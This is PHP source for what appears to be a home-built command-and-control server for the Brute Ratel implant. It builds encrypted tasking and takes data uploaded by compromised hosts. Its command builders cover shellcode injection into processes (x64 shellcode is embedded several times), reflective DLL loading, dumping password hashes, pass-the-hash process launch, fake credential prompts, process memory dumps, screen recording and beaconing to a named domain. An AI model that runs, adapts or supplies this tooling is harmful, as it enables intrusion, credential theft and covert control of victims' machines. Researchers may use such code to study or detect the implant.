$p2 = $p2 . "\x08\x00\x00\x48\x00\x00\x00\x00\x05\x00\x20\x00\x30\x40\x00\x00\x00\x00\x2c\x00\x08\x00\x46\x04\x0a\x05\x00\x00\x01\x00\x00\x00";
$p2 = $p2 . "\x00\x00\x08\x00\x00\x00\xb8\x03\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00\xc2\x04\x70\x00\x18\x00\x08\x00\x00\x48\x00\x00\x00\x00";
$p2 = $p2 . "\x06\x00\x20\x00\x30\x40\x00\x00\x00\x00\x2c\x00\x08\x00\x46\x04\x0a\x05\x00\x00\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\xb8\x03";
$p2 = $p2 . "\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00\x04\x05\x70\x00\x18\x00\x08\x00\x00\x48\x00\x00\x00\x00\x07\x00\x08\x00\x32\x00\x00\x00";
$p2 = $p2 . "\x00\x00\x00\x00\x40\x00\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x08\x00\x30\x00\x30\x40\x00\x00\x00\x00";
$p2 = $p2 . "\x2c\x00\x24\x00\x47\x06\x0a\x07\x01\x00\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\xb8\x03\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00";
$p2 = $p2 . "\x34\x05\x50\x21\x18\x00\x08\x00\x13\x81\x20\x00\x8a\x05\x70\x00\x28\x00\x08\x00\x00\x48\x00\x00\x00\x00\x09\x00\x08\x00\x32\x00";
$p2 = $p2 . "\x00\x00\x00\x00\x00\x00\x40\x00\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x0a\x00\x08\x00\x32\x00\x00\x00";
$p2 = $p2 . "\x00\x00\x00\x00\x40\x00\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x0b\x00\x08\x00\x32\x00\x00\x00\x00\x00";
$p2 = $p2 . "\x00\x00\x40\x00\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x0c\x00\x30\x00\x30\x40\x00\x00\x00\x00\x2c\x00";
$p2 = $p2 . "\x24\x00\x47\x06\x0a\x07\x01\x00\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\xb8\x03\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00\xdc\x05";
$p2 = $p2 . "\x50\x21\x18\x00\x08\x00\x13\x21\x20\x00\x2e\x06\x70\x00\x28\x00\x08\x00\x00\x48\x00\x00\x00\x00\x0d\x00\x08\x00\x32\x00\x00\x00";
$p2 = $p2 . "\x00\x00\x00\x00\x40\x00\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x0e\x00\x08\x00\x32\x00\x00\x00\x00\x00";
$p2 = $p2 . "\x00\x00\x40\x00\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x0f\x00\x08\x00\x32\x00\x00\x00\x00\x00\x00\x00";
$p2 = $p2 . "\x40\x00\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x10\x00\x30\x00\x30\x40\x00\x00\x00\x00\x2c\x00\x24\x00";
$p2 = $p2 . "\x47\x06\x0a\x07\x01\x00\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\xb8\x03\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00\x48\x06\x50\x21";
$p2 = $p2 . "\x18\x00\x08\x00\x13\x41\x20\x00\x72\x06\x70\x00\x28\x00\x08\x00\x00\x48\x00\x00\x00\x00\x11\x00\x30\x00\x30\x40\x00\x00\x00\x00";
$p2 = $p2 . "\x2c\x00\x24\x00\x47\x06\x0a\x07\x01\x00\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\xb8\x03\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00";
$p2 = $p2 . "\x8c\x06\x50\x21\x18\x00\x08\x00\x13\xa1\x20\x00\xc6\x06\x70\x00\x28\x00\x08\x00\x00";
	
	$p1_b64 = base64_encode($p1);
	$p2_b64 = base64_encode($p2);
	
	$cmd_id = "\x81\x98 $p1_b64 $p2_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN toto $DomainName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$level  = 0 -> 501
	$level != 0 -> 502
*/
// netshareenum("home", 1)
function netshareenum($p1, $level)
{
	$cmd_id = "\x53\x49 $p1 $level";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// ExecWQLQuery("SELECT * FROM Win32_OperatingSystem");
function ExecWQLQuery($query)
{
	$cmd_id = "\x13\x52 $query";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// GetAccountSidFromPid(1952)
function GetAccountSidFromPid($pid)
{
	$cmd_id = "\xe7\x81 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function unknown_struct($stringA)
{
	$cmd_id = "\x56\xf8 $stringA";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function unknown_struct2($stringA)
{
	$cmd_id = "\x46\xcb $stringA";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function unknown_memory()
{
	$cmd_id = "\x32\x49";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


// EnumProcessModules(3048);
function EnumProcessModules($pid)
{
	$cmd_id = "\x92\x64 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function CreateProcessSuspended($processPath)
{
	$cmd_id = "\x48\x73 $processPath";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$p1 : base64
	$p2 : optional
	Note : Dll or exe ?
*/
function LoadManagedCode64($filename)
{
	$file = file_get_contents($filename);
	
	$p1_b64 = base64_encode($file);
	
	$cmd_id = "\x44\x80 $p1_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function StartService($MachineName, $ServiceName)
{
	$cmd_id = "\x56\x34 $MachineName $ServiceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function NetSessionEnum($ServerName)
{
	$cmd_id = "\x8E\xB9 $ServerName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// ex: IDirectorySearch("mylab.local", "(&(objectClass=user))", "samAccountName");
function IDirectorySearch($HostName, $SearchFilter, $AttributeNames)
{
	$cmd_id = "\x79\x75 $HostName $SearchFilter $AttributeNames";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function NetUserModalsGet($ServerName)
{
	$cmd_id = "\x9a\xb9 $ServerName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$p1 : servername
	$p2 = 'full' optional
	$p3 = optional
*/
// 15
function GetScheduledTask($serverName)
{
	$cmd_id = "\x9a\xb6 $serverName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 16
// netshareenum2("home\localhost", 1);
function netshareenum2($servername)
{
	$servername_b64 = base64_encode($servername);
	$cmd_id = "\xb3\x29 $servername_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 17
function InjectProcessShellcode($pid)
{
	
	$buf =  "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d";
	$buf =  $buf . "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01";
	$buf =  $buf . "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01";
	$buf =  $buf . "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31";
	$buf =  $buf . "\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45";
	$buf =  $buf . "\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b";
	$buf =  $buf . "\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31";
	$buf =  $buf . "\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2";
	$buf =  $buf . "\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
	
	$payload_b64 = base64_encode($buf);
	$cmd_id = "\xa9\xe4 $pid $payload_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

//18
// Remote Desktop Enum Process
// WtsEnumProcessA("localhost");
function WtsEnumProcessA($RDServerName)
{
	$cmd_id = "\xf3\xd8 $RDServerName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 19
function UpdateConfig($config)
{
	$cmd_id = "\xbf\xb6 $config";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$p1 "int" cmd exec count
	$p2 "int" Sleep in sec
	$p3 "sring" 
*/
function count_exec_cmd($p1, $p2, $p3)
{
	$cmd_id = "\xa9\xb3 $p1 $p2 $p3";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


/*
	Retrieve the full path from the given file,
	Read up to 0x2000 bytes and report the result up to the first null bytes read
*/
function GetFullPathNameW($filename)
{
	$filenameW = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$filename_b64 = base64_encode($filenameW);
	$cmd_id = "\x9a\xe1 $filename_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function inet_ntoa($host)
{
	$cmd_id = "\x57\xa6 $host";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// ex : dump_process_from_pid("4064");
function dump_process_from_pid($pid)
{
	$cmd_id = "\xf1\xa5 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// ex: adjustTokenPrivilege("SeCreateTokenPrivilege");
function adjustTokenPrivilege($privilege)
{
	$cmd_id = "\x63\xd1 $privilege";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

//5 ex: GetFileTimeStamp("autorunsc64.exe");
function GetFileTimeStamp($filename)
{
	$filenameW = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$filename_b64 = base64_encode($filenameW);
	$cmd_id = "\x3a\xe5 $filename_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


// ex: WbemCreateProcess("notepad");
function WbemCreateProcess($CommandLine)
{
	$cmd_id = "\xd3\xb1 $CommandLine";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function listdir2($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x3e\xf8 toto $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// kerberos_auth_todo GetDelegationToken("ldap/MYDC.mylab.local");
function GetDelegationToken($TargetName)
{
	$cmd_id = "\xb9\xe4 $TargetName totooooooooooo";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// ex: ping("tiguanin.com");
function ping($host)
{
	$cmd_id = "\x3a\xb9 $host";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 10 ex: GetCredentialsFromUiPrompt("Knock, knock, Neo.");
function GetCredentialsFromUiPrompt($CaptionText)
{
	$cmd_id = "\x9c\xda $CaptionText";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$p1 = "$pid" | "all"
	$p2 = "alertable" OPTIONAL
*/
function GetThreadsInfo($pid)
{
	$cmd_id = "\xe4\xcd $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$p1 = "pid"
	$p2 = "tid"
	$p3 = "rdll" OPTIONAL
	$p4 = base64(dll)
*/
function InjectSetContext($pid, $tid)
{
	$buf =  "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d";
	$buf =  $buf . "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01";
	$buf =  $buf . "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01";
	$buf =  $buf . "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31";
	$buf =  $buf . "\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45";
	$buf =  $buf . "\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b";
	$buf =  $buf . "\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31";
	$buf =  $buf . "\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2";
	$buf =  $buf . "\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
	
	$buff_b64 = base64_encode($buf);
	
	$cmd_id = "\xba\xe1 $pid $tid lol $buff_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	connect_localhost_global_struct("0");
*/
function connect_localhost_global_struct($index)
{
	$cmd_id = "\xed\xf2 $index";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


/*
	ex: WriteMemory("180000000", "48454c4c4f");
*/
function WriteMemory($address, $data)
{
	$cmd_id = "\xd8\x3b $address $data";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function GetUsersPwdHashes()
{
	$cmd_id = "\x3b\xa2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function CreateProcessConf3()
{
	$buf =  "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d";
	$buf =  $buf . "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01";
	$buf =  $buf . "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01";
	$buf =  $buf . "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31";
	$buf =  $buf . "\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45";
	$buf =  $buf . "\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b";
	$buf =  $buf . "\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31";
	$buf =  $buf . "\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2";
	$buf =  $buf . "\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
	
	$buff_b64 = base64_encode($buf);
	
	$cmd_id = "\xd2\xe3 $buff_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function unknown_update_global_struct()
{
	$cmd_id = "\xd9\xa7";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


// StopService("localhost", "evil");
function StopService($MachineName, $ServiceName)
{

	$cmd_id = "\xb3\xd2 $MachineName $ServiceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


// ex: for 2sec : DelayCmdExec("2000");
function DelayCmdExec($delay)
{

	$cmd_id = "\x9a\x6c $delay";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


// ex: todo("127.0.0.1", "80", "abcd", "42");
function unknown_network($ip, $port, $unknown, $unknown2)
{

	$cmd_id = "\xd1\xf3 $ip $port $unknown $unknown2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function reflective_load($dll)
{
	$file = file_get_contents($dll);
	
	$dll_b64 = base64_encode($file);
	$cmd_id = "\x8c\xed $dll_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function reflective_load2($dll)
{
	$file = file_get_contents($dll);
	
	$dll_b64 = base64_encode($file);
	$cmd_id = "\x8c\x9d $dll_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	As far as I can tell, $opt can be '0' or '1' but doesn't seem to be used
	ex: http_get("0", "tiguanin.com", "80", "/cmd1");
*/
function http_get($opt, $ServerName, $port, $ObjectName)
{
	$cmd_id = "\x9c\xe2 $opt $ServerName $port $ObjectName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// ex : createprocesslogon("azerty", "mylab.local", "Eglantine", "fe67ba01dfde6e658294d48f954de392", "notepad");
function createprocess_pth($p1, $domain, $user_name, $ntlm_hash, $command_line)
{

	$cmd_id = "\x3b\x2d $p1 $domain $user_name $ntlm_hash $command_line";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// get_file_security("autorunsc64.exe");
function get_file_security($file_name)
{
	$file_16le = UConverter::transcode($file_name, 'UTF-16LE', 'UTF-8');
	$b64_file = base64_encode($file_16le);
	$cmd_id = "\x2b\xef $b64_file";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$p1 = "0-14"
*/
// ex: GlobalStructControl("5", "notepad"); // CreateProcess
//     GlobalStructControl("12", "toto.dll"); // LoadLibrary
function GlobalStructControl15($code, $value)
{
	$cmd_id = "\xa9\xc3 $code, $value";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


/*
	Warning, heaving upload size to be expected
	Adapt memory_limit in php.ini or modifify below code accordingly
	ex: screenrecord_jpg("1", "1");
*/
function screenrecord_jpg($p1, $duration)
{
	$cmd_id = "\x41\x9d $p1 $duration";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
	// process data from agent
	$rawhexdata = file_get_contents('php://input');
	$rawbindata = hex2bin($rawhexdata);
	$data = rc4($Rc4Key, $rawbindata);
	$data = $data . "\n*******\n";
	
	// change path to uploaded data file as needed
	file_put_contents("data", $data, FILE_APPEND);

	// we need to aknowledge the initial fingerprint
	if (strpos($data, "p_name") !== false)
	{
		$delay = DelayCmdExec(1000);
		$cmd = "$auth_token, $delay";

		$cmd_enc = rc4($Rc4Key, $cmd);
		$cmd_b64 = base64_encode($cmd_enc);	
	
		echo $cmd_b64;
	
		return;
	}
	
	// 1st command, modify accordingly
	$cmd_id_b64 = ListInstalledPrograms();
	
	// 2nd command
	$cmd_exit = ExitProcess();
	
	// commands can be chained in the following fashion
	// here we get the list of installed programs and exit bruteratel
	$cmd = "$auth_token, $cmd_id_b64, $cmd_exit";
	
	$cmd_enc = rc4($Rc4Key, $cmd);
	$cmd_b64 = base64_encode($cmd_enc);	
	
	echo $cmd_b64;
	
	return;
}

